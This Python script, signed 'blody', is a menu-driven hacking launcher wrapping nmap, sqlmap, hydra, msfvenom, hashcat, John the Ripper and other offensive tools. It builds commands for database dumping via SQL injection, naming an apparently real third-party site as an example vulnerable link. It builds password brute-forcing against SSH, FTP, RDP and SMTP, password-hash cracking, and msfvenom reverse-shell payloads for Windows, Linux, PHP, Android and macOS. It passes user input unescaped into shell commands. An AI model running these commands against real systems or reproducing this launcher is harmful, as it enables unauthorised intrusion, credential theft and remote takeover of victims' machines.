
#!/usr/bin/env python3
#blody

import urllib.error
import os
import urllib.request
import colorama
from colorama import Fore, Back, Style, init
import time
import sys

def clear():
    os.system("clear||cls")

def close():
    os.system("exit")


def nmap():
    clear()
    print("""
    [*]Nmap Tools
        1|-> -n -Pn -p- 1-6535 -sV 192.168.x.x
        2|-> -n -Pn -p- 1-6535 -sC 192.168.x.x
        3|-> -p- 192.168.x.x
        4|-> -sS -Pn -n -sV -sC 192.168.x.x
        5|-> -sS -Pn -n -sV 192.168.x.x
        6|-> -sS -Pn -n -sC 192.168.x.x 
        7|-> -n -Pn -p 21,22,80 -sC 192.168.x.x
        8|-> -n -Pn -p 21,22,80 -sV 192.168.x.x
    """)
    choose = input("Id: ")
    ip = input("Ip: ")
    if(choose=="1"):
        os.system(f"nmap -n -Pn -p- 1-6535 -sV {ip}")
    elif(choose=="2"):
        os.system(f"nmap -n -Pn -p- 1-6535 -sC {ip}")
    elif(choose=="3"):
        os.system(f"nmap -p- {ip}")
    elif(choose=="4"):
        os.system(f"nmap -sS -Pn -n -sV -sC {ip}")
    elif(choose=="5"):
        os.system(f"nmap -sS -Pn -n -sV {ip}")
    elif(choose=="6"):
        os.system(f"nmap -sS -Pn -n -sC {ip}")
    elif(choose=="7"):
        port = input("Port (ex. 21,22,80): ")
        os.system(f"nmap -n -Pn -p {port} -sC {ip}")
    elif(choose=="8"):
        port = input("Port (ex. 21,22,80): ")
        os.system(f"nmap -n -Pn -p {port} -sV {ip} ")
    else:
        close()

def dirsearch():
    clear()
    print("""
    [*]Dirsearch Tools
    1|-> -u http://192.168.x.x
    2|-> -u http://192.168.x.x -w /usr/share/wordlists/dirb/common.txt    
    3|-> -u http://192.168.x.x -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    4|-> -u http://192.168.x.x -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
    5|-> -u http://192.168.x.x -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
    6|-> -u http://192.168.x.x -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
    
    """)
    choose = input("Id: ")
    ip = input("Ip: ")
    if choose=="1":
        os.system(f"dirsearch -u http://{ip}")
    elif(choose=="2"):
        os.system(f"dirsearch -u http://{ip} -w /usr/share/wordlists/dirb/common.txt")
    elif(choose=="3"):
        os.system(f"dirsearch -u http://{ip} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt")
    elif(choose=="4"):
        os.system(f"dirsearch -u http://{ip} -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt")
    elif(choose=="5"):
        os.system(f"dirsearch -u http://{ip} -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt")
    elif(choose=="6"):
        os.system(f"dirsearch -u http://{ip} -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt")
    else:
        close()

def gobuster():
    clear()
    print("""
    [*]Gobuster Tools
        1|-> dir -w /usr/share/wordlists/dirb/common.txt -u http://192.168.x.x
        2|-> dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.x.x
        3|-> dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.x.x
        4|-> dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -u http://192.168.x.x
        5|-> dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://192.168.x.x
        6|-> dir -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -u http://192.168.x.x
    """)
    choose = input("Id: ")
    ip = input("Ip: ")
    if(choose=="1"):
        os.system(f"gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://{ip}")
    elif(choose=="2"):
        os.system(f"gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://{ip}")
    elif(choose=="3"):
        os.system(f"gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://{ip}")
    elif(choose=="4"):
        os.system(f"gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -u http://{ip}")
    elif(choose=="5"):
        os.system(f"gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://{ip}")
    elif(choose=="6"):
        os.system(f"gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -u http://{ip}")
    else:
        close()

def rustscan():
    clear()
    print("""
    [*]Rustscan Tools
        1|-> -a 192.168.x.x
        2|-> -a 192.168.x.x -r 1-1000
        3|-> -a 192.168.x.x -p 22,80,443
        4|-> -a 192.168.x.x -- -A(slow!)
    """)
    choose = input("Id: ")
    ip = input("Ip: ")
    if(choose=="1"):
        os.system(f"rustscan -a {ip}")
    elif(choose=="2"):
        port = input("Port (ex. 1-1000): ")
        os.system(f"rustscan -a {ip} -r {port}")
    elif(choose=="3"):
        port = input("Port (ex. 21,22,80): ")
        os.system(f"rustscan -a {ip} -p {port}")
    elif(choose=="4"):
        os.system(f"rustscan -a {ip} -- -A")
    else:
        close()

def sqlmap():
    clear()
    print("""
    [*] Sqlmap Tools
        1|-> -u "https://example.com" --dbs --random-agent
        2|-> -u "https://example.com" -D db_name --tables --random-agent
        3|-> -u "https://example.com" -D db_name -T tb_name --columns --random-agent
        4|-> -u "https://example.com" -D db_name -T tb_name -C cl_name --dump --random-agent 

    *|-> ex. vuln link : http://www.suesupriano.com/article.php?id=25
    """)
    
    choose = input("Id: ")
    link = input("Link: ")

    if choose == "1":
        os.system(f'sqlmap -u "{link}" --dbs --random-agent')

    elif choose == "2":
        db_name = input("Database name: ")
        os.system(f'sqlmap -u "{link}" -D "{db_name}" --tables --random-agent')

    elif choose == "3":
        db_name = input("Database name: ")
        tb_name = input("Tables name: ")
        os.system(f'sqlmap -u "{link}" -D {db_name} -T {tb_name} --columns --random-agent')

    elif choose == "4":
        db_name = input("Database name: ")
        tb_name = input("Tables name: ")
        cl_name = input("Column name: ")
        os.system(f'sqlmap -u "{link}" -D {db_name} -T {tb_name} -C {cl_name} --dump --random-agent')

    else:
        close()

def wpscan():
    clear()
    print("""
    [*]Wpscan Tools
        1|-> --url http://example.com
        2|-> --url http://example.com --enumerate p
        3|-> --url http://example.com --enumerate u
        4|-> --url http://example.com --enumerate t
    """)
    choose = input("Id: ")
    ip = input("Ip: ")
    if(choose=="1"):
        os.system(f"wpscan --url http://{ip}")
    elif(choose=="2"):
        os.system(f"wpscan --url http://{ip} --enumerate p")
    elif(choose=="3"):
        os.system(f"wpscan --url http://{ip} --enumerate u")
    elif(choose=="4"):
        os.system(f"wpscan --url http://{ip} --enumerate t")
    else:
        close()

def httpx():
    clear()
    print("""
    [*]Httpx Tools
        1|-> echo "http://192.168.x.x" | httpx
        2|-> echo "http://192.168.x.x" | httpx -H "User-Agent: Mozilla/5.0"
        3|-> echo "http://192.168.x.x" | httpx -tls-probe
        4|-> echo "http://192.168.x.x" | httpx -status-code -mc 200
        5|-> echo "http://192.168.x.x" | httpx -o output.txt
    """)
    choose = input("Id: ")
    ip = input("Ip: ")
    if(choose=="1"):
        os.system(f'echo "http://{ip}" | httpx')
    elif(choose=="2"):
        os.system(f'echo "http://{ip}" | httpx -H "User-Agent: Mozilla/5.0"')
    elif(choose=="3"):
        os.system(f'echo "http://{ip}" | httpx -tls-probe')
    elif(choose=="4"):
        stat = input("Status code: ")
        os.system(f'echo "http://{ip}" | httpx -status-code -mc {stat}')
    elif(choose=="5"):
        output = input("Output file name: ")
        os.system(f'echo "http://{ip}" | httpx -o {output}.txt')
    else:
        close()

def hydra():
    clear()
    print("""
    [*]Hydra Tools
        1|-> -l admin -P /path/to/password/list.txt ftp://192.168.x.x
        2|-> -l root -P /path/to/password/list.txt ssh://192.168.x.x
        3|-> -l admin -P /path/to/password/list.txt 192.168.x.x http-get /
        4|-> -t 1 -V -f -l admin -P /path/to/password/list.txt rdp://192.168.x.x
        5|-> -S -l user@example.com -P /path/to/password/list.txt smtp://192.168.x.x
    """)
    choose = input("Id: ")
    ip = input("Ip: ")
    if(choose=="1"):
        username = input("Username: ")
        wordlist = input("Wordlist (ex. /usr/share/wordlists/rockyou.txt): ")
        os.system(f"hydra -l {username} -P {wordlist} ftp://{ip}")
    elif(choose=="2"):
        username = input("Username: ")
        wordlist = input("Wordlist (ex. /usr/share/wordlists/rockyou.txt): ")
        os.system(f"hydra -l {username} -P {wordlist} ssh://{ip}")
    elif(choose=="3"):
        username = input("Username: ")
        wordlist = input("Wordlist (ex. /usr/share/wordlists/rockyou.txt): ")
        os.system(f"hydra -l {username} -P {wordlist} {ip} http-get /")
    elif(choose=="4"):
        username = input("Username: ")
        wordlist = input("Wordlist (ex. /usr/share/wordlists/rockyou.txt): ")
        os.system(f"hydra -t 1 -V -f -l {username} -P {wordlist} rdp://{ip}")
    elif(choose=="5"):
        mail = input("Mail (ex. user@example.com): ")
        wordlist = input("Wordlist (ex. /usr/share/wordlists/rockyou.txt): ")
        os.system(f"hydra -S -l {mail} -P {wordlist} smtp://{ip}")
    else:
        close()

def admin():
    clear()
    print("""
    [*] Admin Panel Tools
    
    
    
    
    
    """)

    try:
        url = input("Site: ").strip()
        if not url.startswith('http'):
            url = 'http://' + url  # URL'nin başına http ekleyin
        print("\nScan started.\n")

        passe = [
            'cpanel/', 'admin/', 'administrator/', 'login.php', 'administration/', 'admin1/', 'admin2/',
            'admin3/', 'admin4/', 'admin5/', 'moderator/', 'webadmin/', 'adminarea/', 'bb-admin/',
            'adminLogin/', 'admin_area/', 'panel-administracion/', 'instadmin/', 'memberadmin/',
            'administratorlogin/', 'adm/', 'account.asp', 'admin/account.asp', 'admin/index.asp',
            'admin/login.asp', 'admin/admin.asp', 'login.aspx', 'admin_area/admin.asp',
            'admin_area/login.asp', 'admin/account.html', 'admin/index.html', 'admin/login.html',
            'admin/admin.html', 'admin_area/admin.html', 'admin_area/login.html', 'admin_area/index.html',
            'admin_area/index.asp', 'bb-admin/index.asp', 'bb-admin/login.asp', 'bb-admin/admin.asp',
            'bb-admin/index.html', 'bb-admin/login.html', 'bb-admin/admin.html', 'admin/home.html',
            'admin/controlpanel.html', 'admin.html', 'admin/cp.html', 'cp.html', 'administrator/index.html',
            'administrator/login.html', 'administrator/account.html', 'administrator.html', 'login.html',
            'modelsearch/login.html', 'moderator.html', 'moderator/login.html', 'moderator/admin.html',
            'account.html', 'controlpanel.html', 'admincontrol.html', 'admin_login.html',
            'panel-administracion/login.html', 'admin/home.asp', 'admin/controlpanel.asp', 'admin.asp',
            'pages/admin/admin-login.asp', 'admin/admin-login.asp', 'admin-login.asp', 'admin/cp.asp',
            'cp.asp', 'administrator/account.asp', 'administrator.asp', 'acceso.asp', 'login.asp',
            'modelsearch/login.asp', 'moderator.asp', 'moderator/login.asp', 'administrator/login.asp',
            'moderator/admin.asp', 'controlpanel.asp', 'admin/account.html', 'adminpanel.html', 'webadmin.html',
            'administration', 'pages/admin/admin-login.html', 'admin/admin-login.html', 'webadmin/index.html',
            'webadmin/admin.html', 'webadmin/login.html', 'user.asp', 'user.html', 'admincp/index.asp',
            'admincp/login.asp', 'admincp/index.html', 'admin/adminLogin.html', 'adminLogin.html',
            'admin/adminLogin.html', 'home.html', 'adminarea/index.html', 'adminarea/admin.html',
            'adminarea/login.html', 'panel-administracion/index.html', 'panel-administracion/admin.html',
            'modelsearch/index.html', 'modelsearch/admin.html', 'admin/admin_login.html', 'admincontrol/login.html',
            'adm/index.html', 'adm.html', 'admincontrol.asp', 'admin/account.asp', 'adminpanel.asp', 'webadmin.asp',
            'webadmin/index.asp', 'webadmin/admin.asp', 'webadmin/login.asp', 'admin/admin_login.asp', 'admin_login.asp',
            'panel-administracion/login.asp', 'adminLogin.asp', 'admin/adminLogin.asp', 'home.asp', 'admin.asp',
            'adminarea/index.asp', 'adminarea/admin.asp', 'adminarea/login.asp', 'admin-login.html',
            'panel-administracion/index.asp', 'panel-administracion/admin.asp', 'modelsearch/index.asp',
            'modelsearch/admin.asp', 'administrator/index.asp', 'admincontrol/login.asp', 'adm/admloginuser.asp',
            'admloginuser.asp', 'admin2.asp', 'admin2/login.asp', 'admin2/index.asp', 'adm/index.asp', 'adm.asp',
            'affiliate.asp', 'adm_auth.asp', 'memberadmin.asp', 'administratorlogin.asp', 'siteadmin/login.asp',
            'siteadmin/index.asp', 'siteadmin/login.html', 'memberadmin/', 'administratorlogin/', 'adm/',
            'admin/account.php', 'admin/index.php', 'admin/login.php', 'admin/admin.php', 'admin/account.php',
            'admin_area/admin.php', 'admin_area/login.php', 'siteadmin/login.php', 'siteadmin/index.php',
            'siteadmin/login.html', 'admin/account.html', 'admin/index.html', 'admin/login.html', 'admin/admin.html',
            'admin_area/index.php', 'bb-admin/index.php', 'bb-admin/login.php', 'bb-admin/admin.php',
            'admin/home.php', 'admin_area/login.html', 'admin_area/index.html', 'admin/controlpanel.php',
            'admin.php', 'admincp/index.asp', 'admincp/login.asp', 'admincp/index.html', 'admin/account.html',
            'adminpanel.html', 'webadmin.html', 'webadmin/index.html', 'webadmin/admin.html', 'webadmin/login.html',
            'admin/admin_login.html', 'admin_login.html', 'panel-administracion/login.html', 'admin/cp.php', 'cp.php',
            'administrator/index.php', 'administrator/login.php', 'nsw/admin/login.php', 'webadmin/login.php',
            'admin/admin_login.php', 'admin_login.php', 'administrator/account.php', 'administrator.php',
            'admin_area/admin.html', 'pages/admin/admin-login.php', 'admin/admin-login.php', 'admin-login.php',
            'bb-admin/index.html', 'bb-admin/login.html', 'acceso.php', 'bb-admin/admin.html', 'admin/home.html',
            'login.php', 'modelsearch/login.php', 'moderator.php', 'moderator/login.php', 'moderator/admin.php',
            'account.php', 'pages/admin/admin-login.html', 'admin/admin-login.html', 'admin-login.html',
            'controlpanel.php', 'admincontrol.php', 'admin/adminLogin.html', 'adminLogin.html', 'admin/adminLogin.html',
            'home.html', 'rcjakar/admin/login.php', 'adminarea/index.html', 'adminarea/admin.html', 'webadmin.php',
            'webadmin/index.php', 'webadmin/admin.php', 'admin/controlpanel.html', 'admin.html', 'admin/cp.html',
            'cp.html', 'adminpanel.php', 'moderator.html', 'administrator/index.html', 'administrator/login.html',
            'user.html', 'administrator/account.html', 'administrator.html', 'login.html', 'modelsearch/login.html',
            'moderator/login.html', 'adminarea/login.html', 'panel-administracion/index.html', 'panel-administracion/admin.html',
            'modelsearch/index.html', 'modelsearch/admin.html', 'admincontrol/login.html', 'adm/index.html',
            'adm.html', 'moderator/admin.html', 'user.php', 'account.html', 'controlpanel.html', 'admincontrol.html',
            'login.php'
        ]

        for hani in passe:
            curl = url + hani
            try:
                response = urllib.request.urlopen(curl)
                if response.status == 200:
                    print("_____________________________________________________________")
                    print("\n           Found:  " + curl)
                    print("_____________________________________________________________")
                else:
                    print("          Not Found:  " + curl)
            except urllib.error.HTTPError as e:
                if e.code == 404:
                    print("          Not Found:  " + curl)
                else:
                    print(f"          Error ({e.code}): {curl}")
            except urllib.error.URLError as e:
                print(f"          Error: {curl} - {e.reason}")

    except KeyboardInterrupt:
        print("\nProgram closed!")
        close()

def johntheripper():
    clear()
    print("""
    [*]John The Ripper Tools
        1|-> --wordlist=/path/to/wordlist.txt hashfile.txt
        2|-> --format=raw-md5 --wordlist=/path/to/wordlist.txt hashfile.txt
        3|-> --show hashfile.txt
        4|-> --format=NT hashfile.txt
        5|-> hashfile.txt
    """)
    choose = input("Id: ")
    if(choose=="1"):
        wordlist = input("Wordlist (ex. /usr/share/wordlists/rockyou.txt): ")
        hash = input("Hash file (ex. hash.txt): ")
        os.system(f"john --wordlist={wordlist} {hash}")
    elif(choose=="2"):
        wordlist = input("Wordlist (ex. /usr/share/wordlists/rockyou.txt): ")
        format = input("Format (ex. raw-md5): ")
        os.system(f"john --format={format} --wordlist={wordlist} {hash}")
    elif(choose=="3"):
        hash = input("Hash file (ex. hash.txt): ")
        os.system(f"john --show {hash}")
    elif(choose=="4"):
        format = input("Format (ex. NT): ")
        hash = input("Hash file (ex. hash.txt): ")
        os.system(f"john --format={format} {hash}")
    elif(choose=="5"):
        hash = input("Hash file (ex. hash.txt): ")
        os.system(f"john {hash}")
    else:
        close()

def msfvenom():
    clear()
    print("""
    [*]Msfvenom Tools
        1|-> -p windows/meterpreter/reverse_tcp LHOST=192.168.x.x LPORT=1111 -f exe -o shell.exe
        2|-> -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.x.x LPORT=2222 -f elf -o shell.elf
        3|-> -p php/meterpreter_reverse_tcp LHOST=192.168.x.x LPORT=3333 -f raw -o shell.php
        4|-> -p android/meterpreter/reverse_tcp LHOST=192.168.x.x LPORT=4444 -o app.apk
        5|-> -p osx/x86/shell_reverse_tcp LHOST=192.168.x.x LPORT=5555 -f macho -o shell.macho
    """)
    choose = input("Id: ")
    ip = input("Ip: ")
    if(choose=="1"):
        port = input("Port: ")
        exe = input("Exe name: ")
        os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o {exe}.exe")
    elif(choose=="2"):
        port = input("Port: ")
        elf = input("Elf name: ")
        os.system(f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o {elf}.elf")
    elif(choose=="3"):
        port = input("Port: ")
        php = input("Php name: ")
        os.system(f"msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f raw -o {php}.php")
    elif(choose=="4"):
        port = input("Port: ")
        apk = input("Apk name: ")
        os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {apk}.apk")
    elif(choose=="5"):
        port = input("Port: ")
        macho = input("Macho name: ")
        os.system(f"msfvenom -p osx/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -f macho -o {macho}.macho")
    else:
        close()

def hashcat():
    clear()
    print("""
    [*]Hashcat Tools
        1|-> MD5: -a 0 -m 0 hash.txt wordlist.txt
        2|-> SHA-1: -a 0 -m 100 hash.txt wordlist.txt
        3|-> NTLM: -a 0 -m 1000 hash.txt wordlist.txt
        4|-> Mask: -a 3 -m 0 hash.txt ?a?a?a?a?a?a?a?a
        5|-> Hybrid: -a 6 -m 0 hash.txt wordlist.txt ?d?d?d
    """)
    choose = input("Id: ")
    if(choose=="1"):
        wordlist = input("Wordlist (ex. /example/wordlist.txt): ")
        hash = input("Hash file (ex. /example/hash.txt): ")
        os.system(f"hashcat -a 0 -m 0 {hash} {wordlist}")
    elif(choose=="2"):
        wordlist = input("Wordlist (ex. /example/wordlist.txt): ")
        hash = input("Hash file (ex. /example/hash.txt): ")
        os.system(f"hashcat -a 0 -m 100 {hash} {wordlist}")
    elif(choose=="3"):
        wordlist = input("Wordlist (ex. /example/wordlist.txt): ")
        hash = input("Hash file (ex. /example/hash.txt): ")
        os.system(f"hashcat -a 0 -m 1000 {hash} {wordlist}")
    elif(choose=="4"):
        hash = input("Hash file (ex. /example/hash.txt): ")
        os.system(f"hashcat -a 3 -m 0 {hash} ?a?a?a?a?a?a?a?a")
    elif(choose=="5"):
        wordlist = input("Wordlist (ex. /example/wordlist.txt): ")
        hash = input("Hash file (ex. /example/hash.txt): ")
        os.system(f"hashcat -a 6 -m 0 {hash} {wordlist} ?d?d?d")
    else:
        close()

def nikto():
    clear()
    print("""
    [*]Nikto Tools
        1|-> -h https://example.com
        2|-> -h https://example.com -ssl
        3|-> -h https://example.com -output output.txt
        4|-> -h https://example.com -Plugins "+xss,+sqli"
        5|-> -h https://example.com -port 4444
    """)
    choose = input("Id: ")
    url = input("Url: ")
    if(choose=="1"):
        os.system(f"nikto -h {url}")
    elif(choose=="2"):
        os.system(f"nikto -h {url} -ssl")
    elif(choose=="3"):
        output = input("Output file (ex. output.txt): ")
        os.system(f"nikto -h {url} -output {output}")
    elif(choose=="4"):
        os.system(f'nikto -h {url} -Plugins "+xss,+sqli" ')
    elif(choose=="5"):
        port = input("Port: ")
        os.system(f"nikto -h {url} -port {port}")
    else:
        close()

def enum4linux():
    clear()
    print("""
    [*]Enum4Linux Tools
        1|-> 192.168.x.x
        2|-> -U 192.168.x.x
        3|-> -G 192.168.x.x
        4|-> -P 192.168.x.x
        5|-> -p 192.168.x.x
    """)
    choose = input("Id: ")
    ip = input("Ip: ")
    if(choose=="1"):
        os.system(f"enum4linux {ip}")
    elif(choose=="2"):
        os.system(f"enum4linux -U {ip}")
    elif(choose=="3"):
        os.system(f"enum4linux -G {ip}")
    elif(choose=="4"):
        os.system(f"enum4linux -P {ip}")
    elif(choose=="5"):
        os.system(f"enum4linux -p {ip}")
    else:
        close()

def ffuf():
    clear()
    print("""
    [*]Ffuf Tools
        1|-> -u http://192.168.x.x/FUZZ -w /path/to/wordlist.txt
        2|-> -u http://192.168.x.x/index.php?FUZZ=test -w /path/to/wordlist.txt
        3|-> -u http://192.168.x.x -H "FUZZ: test" -w /path/to/wordlist.txt
        4|-> -u http://192.168.x.x/file.FUZZ -w /path/to/extensions.txt
        5|-> -u http://192.168.x.x/login -d "username=admin&password=FUZZ" -w /path/to/wordlist.txt
    """)
    choose = input("Id: ")
    ip = input("Ip: ")
    if(choose=="1"):
        wordlist = input("Wordlist (/path/to/wordlist.txt): ")
        os.system(f"ffuf -u http://{ip}/FUZZ -w {wordlist}")
    elif(choose=="2"):
        wordlist = input("Wordlist (/path/to/wordlist.txt): ")
        os.system(f"ffuf -u http://{ip}/index.php?FUZZ=test -w {wordlist}")
    elif(choose=="3"):
        wordlist = input("Wordlist (/path/to/wordlist.txt): ")
        os.system(f'ffuf -u http://{ip} -H "FUZZ: test" -w {wordlist}')
    elif(choose=="4"):
        wordlist = input("Wordlist (/path/to/wordlist.txt): ")
        os.system(f"ffuf -u http://{ip}/file.FUZZ -w {wordlist}")
    elif(choose=="5"):
        wordlist = input("Wordlist (/path/to/wordlist.txt): ")
        os.system(f'ffuf -u http://{ip}/login -d "username=admin&password=FUZZ" -w {wordlist}')
    else:
        close()

clear()
#---------------------------------------------------------------------------------------------|
#print("""                                                                                    |
# ____  _     ___  ______   __  _   _    _    ____ _  __                                      |
#| __ )| |   / _ \|  _ \ \ / / | | | |  / \  / ___| |/ /                                      |
#|  _ \| |  | | | | | | \ V /  | |_| | / _ \| |   | ' /                                       |
#| |_) | |__| |_| | |_| || |   |  _  |/ ___ \ |___| . \                                       |
#|____/|_____\___/|____/ |_|   |_| |_/_/   \_\____|_|\_\                                      |
#                                                                                             |
# _____ ___   ___  _                                                                          |
#|_   _/ _ \ / _ \| |                                                                         |
#  | || | | | | | | |                                                                         |
#  | || |_| | |_| | |___                                                                      |
#  |_| \___/ \___/|_____|                                                                     |
#""")                                                                                         |
#print("""                                                                                    |
# ____  _     ___  ______   __                                                                |
#| __ )| |   / _ \|  _ \ \ / /                                                                |
#|  _ \| |  | | | | | | \ V /                                                                 |
#| |_) | |__| |_| | |_| || |                                                                  |
#|____/|_____\___/|____/ |_|                                                                  |
#""")                                                                                         |
#---------------------------------------------------------------------------------------------|
def main_menu():
    print("""


     ▄▄▄▄    ██▓     ▒█████  ▓█████▄▓██   ██▓
    ▓█████▄ ▓██▒    ▒██▒  ██▒▒██▀ ██▌▒██  ██▒
    ▒██▒ ▄██▒██░    ▒██░  ██▒░██   █▌ ▒██ ██░
    ▒██░█▀  ▒██░    ▒██   ██░░▓█▄   ▌ ░ ▐██▓░
    ░▓█  ▀█▓░██████▒░ ████▓▒░░▒████▓  ░ ██▒▓░
    ░▒▓███▀▒░ ▒░▓  ░░ ▒░▒░▒░  ▒▒▓  ▒   ██▒▒▒ 
    ▒░▒   ░ ░ ░ ▒  ░  ░ ▒ ▒░  ░ ▒  ▒ ▓██ ░▒░ 
     ░    ░   ░ ░   ░ ░ ░ ▒   ░ ░  ░ ▒ ▒ ░░  
     ░          ░  ░    ░ ░     ░    ░ ░     
          ░   code by blody    ░      ░ ░     
     
     Github: @blody77       
     İnstagram: @blody.sql
    """)
    print("""
    [1]Nmap Tools
    [2]Dirsearch Tools
    [3]Gobuster Tools
    [4]Rustscan Tools
    [5]Sqlmap Tools
    [6]Wpscan Tools
    [7]Httpx Tools
    [8]Hydra Tools
    [9]AdminPanel Tools(currently unavaliable)
    [10]John The Ripper Tools
    [11]Msfvenom Tools
    [12]Hashcat Tools
    [13]Nikto Tools
    [14]Enum4Linux Tools
    [15]Ffuf Tools
    
    """)

try:
    clear()
    main_menu()
    select = input("Enter the tool ID (1-15): ")

    if select == "1":
        nmap()
    elif select == "2":
        dirsearch()
    elif select == "3":
        gobuster()
    elif select == "4":
        rustscan()
    elif select == "5":
        sqlmap()
    elif select == "6":
        wpscan()
    elif select == "7":
        httpx()
    elif select == "8":
        hydra()
    elif select == "9":
        admin()
    elif select == "10":
        johntheripper()
    elif select == "11":
        msfvenom()
    elif select == "12":
        hashcat()
    elif select == "13":
        nikto()
    elif select == "14":
        enum4linux()
    elif select == "15":
        ffuf()
    else:
        print("Invalid selection. Please enter a number from 1 to 15.")
except Exception as e:
    print(f"\nProgram closed. Exiting...")
